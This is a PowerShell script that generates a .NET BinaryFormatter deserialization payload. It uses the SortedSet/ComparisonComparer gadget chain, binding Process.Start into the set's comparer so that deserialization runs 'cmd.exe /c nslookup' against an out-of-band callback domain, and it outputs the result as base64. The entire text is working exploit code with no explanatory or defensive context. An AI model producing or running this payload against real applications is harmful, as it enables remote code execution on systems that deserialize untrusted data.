# --- Configuration ---
$domain = "tihgeugvaqszxdlzjzzd9pbnc7h91d97x.oast.fun"
$command = "cmd.exe"
$arguments = "/c nslookup $domain"

# --- Payload Construction ---
Write-Host "[*] Building nslookup Deserialization payload..." -ForegroundColor Cyan

# 1. Create a delegate bound to Process.Start(string, string)
$processType = [System.Diagnostics.Process]
$startMethod = $processType.GetMethod('Start', [Type[]]@([string], [string]))
$maliciousDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $startMethod)

# 2. Load the internal ComparisonComparer<string> type via Reflection
$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])

# 3. Create an instance of ComparisonComparer<string> with the malicious delegate
$comparisonDelegateType = [System.Comparison[string]]
$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
$maliciousComparer = $constructor.Invoke(@($maliciousDelegate))

# 4. Create a SortedSet and populate it with dummy data using the default comparer
$sortedSet = New-Object 'System.Collections.Generic.SortedSet[string]'
$sortedSet.Add("dummy1") | Out-Null
$sortedSet.Add("dummy2") | Out-Null

# 5. Dynamically find the internal comparer field and swap it
$fields = $sortedSet.GetType().GetFields([System.Reflection.BindingFlags]'NonPublic, Instance')
$comparerField = $fields | Where-Object { $_.FieldType -eq [System.Collections.Generic.IComparer[string]] } | Select-Object -First 1

if (-not $comparerField) {
    Write-Host "[-] Could not find comparer field dynamically. Aborting." -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Found comparer field: '$($comparerField.Name)'" -ForegroundColor Green
}

$comparerField.SetValue($sortedSet, $maliciousComparer)

# --- Serialization ---
Write-Host "[*] Serializing object..." -ForegroundColor Cyan
try {
    $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
    $ms = New-Object System.IO.MemoryStream
    $formatter.Serialize($ms, $sortedSet)
    
    $payload = $ms.ToArray()
    if ($payload.Length -eq 0) { throw "Serialization returned empty." }

    $base64Payload = [Convert]::ToBase64String($payload)
    Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
    Write-Host "Base64 Payload: $base64Payload"
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
}
